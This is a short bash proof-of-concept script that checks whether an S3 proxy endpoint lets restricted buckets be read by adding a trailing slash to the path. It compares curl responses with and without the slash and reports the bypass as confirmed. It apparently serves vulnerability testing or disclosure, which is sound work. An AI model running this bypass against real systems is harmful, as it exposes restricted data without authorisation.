#!/bin/bash

# POC: Path Traversal / Directory Traversal - Hidden Bucket Access via Trailing Slash
# Target: S3 proxy endpoint at /s3/
# Description: Demonstrates that restricted buckets can be accessed by appending a trailing slash

TARGET_URL="${1:-http://localhost:3000}"
BUCKET_NAME="${2:-gold}"

echo "================================================"
echo "Path Traversal via Trailing Slash - S3 Proxy POC"
echo "================================================"
echo "Target: ${TARGET_URL}"
echo "Bucket: ${BUCKET_NAME}"
echo ""

# Test 1: Without trailing slash (should fail for restricted bucket)
echo "[Test 1] Testing WITHOUT trailing slash: ${TARGET_URL}/s3/${BUCKET_NAME}"
RESPONSE_NO_SLASH=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${BUCKET_NAME}")
HTTP_CODE_NO_SLASH=$(echo "$RESPONSE_NO_SLASH" | tail -n1)
BODY_NO_SLASH=$(echo "$RESPONSE_NO_SLASH" | head -n-1)

echo "HTTP Status: ${HTTP_CODE_NO_SLASH}"
echo "Response (first 300 chars):"
echo "$BODY_NO_SLASH" | head -c 300
echo ""
echo ""

# Test 2: With trailing slash (should succeed, bypassing restriction)
echo "[Test 2] Testing WITH trailing slash: ${TARGET_URL}/s3/${BUCKET_NAME}/"
RESPONSE_WITH_SLASH=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${BUCKET_NAME}/")
HTTP_CODE_WITH_SLASH=$(echo "$RESPONSE_WITH_SLASH" | tail -n1)
BODY_WITH_SLASH=$(echo "$RESPONSE_WITH_SLASH" | head -n-1)

echo "HTTP Status: ${HTTP_CODE_WITH_SLASH}"
echo "Response (first 300 chars):"
echo "$BODY_WITH_SLASH" | head -c 300
echo ""
echo ""

# Analysis
echo "================================================"
echo "ANALYSIS:"
echo "================================================"

if [ "$HTTP_CODE_NO_SLASH" = "404" ]; then
    echo "✓ Without slash returns 404 (access denied)"
else
    echo "✗ Without slash returns $HTTP_CODE_NO_SLASH (unexpected)"
fi

if [ "$HTTP_CODE_WITH_SLASH" = "200" ]; then
    echo "✓ With slash returns 200 (access granted - VULNERABLE!)"
    echo ""
    echo "VULNERABILITY CONFIRMED:"
    echo "Restricted bucket '$BUCKET_NAME' is accessible via trailing slash bypass"
    echo "This indicates improper path normalization in the S3 proxy endpoint"
    exit 0
else
    echo "✗ With slash returns $HTTP_CODE_WITH_SLASH"
    echo ""
    echo "Trailing slash did not bypass restriction"
    exit 1
fi